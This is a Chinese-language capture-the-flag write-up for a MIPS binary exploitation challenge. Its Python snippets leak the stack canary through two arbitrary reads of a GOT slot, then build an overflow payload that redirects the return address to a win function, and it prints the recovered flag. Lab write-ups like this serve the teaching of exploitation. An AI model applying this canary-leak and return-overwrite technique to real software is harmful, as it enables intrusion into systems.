# MIPS

## 题目简述

目标是无 PIE 的 32 位小端 MIPS ELF，启用栈 canary。菜单提供两次任意 32 位内存读取，随后有一个 16 字节栈缓冲区的 0x30 字节输入溢出，二进制中存在 `win` 函数。

MIPS 动态链接布局中，地址 `0x420060` 的 GOT 槽保存的是 canary 的地址。两次读取恰好足以完成“GOT 槽到指针，再从指针到 canary 值”的二级解引用。

## 解题过程

第一次读取固定 GOT 地址，得到链接器区域内的 canary 指针；第二次读取该指针，得到当前进程的 32 位 canary：

```python
CANARY_GOT = 0x420060
canary_addr = arbitrary_read(CANARY_GOT)
canary = arbitrary_read(canary_addr)
```

缓冲区到 canary 的偏移为 `0x10`。小端序 payload 依次放入填充、真实 canary、保存的 `$s8` 和返回地址；`win` 的固定地址为 `0x400964`：

```python
payload = flat(
    b"A" * 0x10,
    p32(canary),
    p32(0),
    p32(0x400964),
)
sendline(payload)
```

canary 校验通过后函数返回 `win`，输出：

```text
byuctf{h0p3_y0u_d1dnt_h4v3_un1c0rn_2.1.3_cuz_M1PS_s3gf4ultz_th3r3}
```

题目容器固定了 qemu 和 libc；本地复现应沿用该环境。官方还特别指出 Unicorn 2.1.3 与当时的 MIPS/pwntools 组合会崩溃，这属于工具环境问题，不是利用链的一部分。

## 方法总结

- 核心技巧：利用两次任意读对 MIPS GOT 中的 canary 指针做二级解引用，再带正确 canary 覆盖返回地址。
- 识别信号：非 x86 架构不能照搬 TLS canary 位置；若读原语次数受限，应先检查 GOT 或运行时数据结构是否直接保存目标指针。
- 复用要点：确认架构、端序、ABI 栈布局和保存寄存器顺序；调试环境应与题目给出的 qemu/libc 版本一致。
